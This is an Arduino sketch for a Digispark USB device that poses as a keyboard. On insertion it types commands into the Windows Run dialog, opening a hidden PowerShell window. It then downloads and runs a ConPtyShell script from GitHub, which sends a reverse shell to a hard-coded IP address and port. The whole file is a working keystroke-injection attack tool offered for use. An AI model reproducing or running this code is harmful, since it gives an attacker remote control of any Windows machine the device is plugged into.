// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
// This script credits to Ethical Hacking youtube channel

#include "DigiKeyboard.h"
void setup() {
}

void loop() {

    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.print("ppowershell  -noe -c mode.com con: lines=10 cols=15");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.45.102 87");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
